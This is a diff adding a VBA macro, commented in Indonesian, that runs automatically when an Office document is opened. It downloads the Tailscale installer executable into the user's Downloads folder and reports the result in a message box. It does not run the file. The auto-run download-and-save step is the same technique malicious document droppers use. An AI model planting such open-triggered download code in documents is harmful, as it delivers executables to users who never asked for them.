@@ -1,0 +1,33 @@
+Private Sub Document_Open()
+    Dim http As Object
+    Dim stream As Object
+    Dim filePath As String
+    Dim fileURL As String
+    Dim userProfile As String
+
+    ' Ambil path user menggunakan Environ
+    userProfile = Environ("USERPROFILE")
+
+    ' Tentukan URL file dan lokasi penyimpanan yang benar
+    fileURL = "https://dl.tailscale.com/stable/tailscale-setup-1.80.2.exe"
+    filePath = userProfile & "\Downloads\tailscale-setup-1.80.2.exe"
+
+    ' Buat objek HTTP
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", fileURL, False
+    http.Send
+
+    ' Periksa apakah unduhan berhasil (HTTP 200)
+    If http.Status = 200 Then
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1 ' Binary
+        stream.Open
+        stream.Write http.ResponseBody
+        stream.SaveToFile filePath, 2 ' Overwrite jika file ada
+        stream.Close
+        MsgBox "Download berhasil disimpan di: " & filePath, vbInformation, "Sukses"
+    Else
+        MsgBox "Gagal mengunduh file. Status: " & http.Status, vbExclamation
+    End If
+End Sub
+
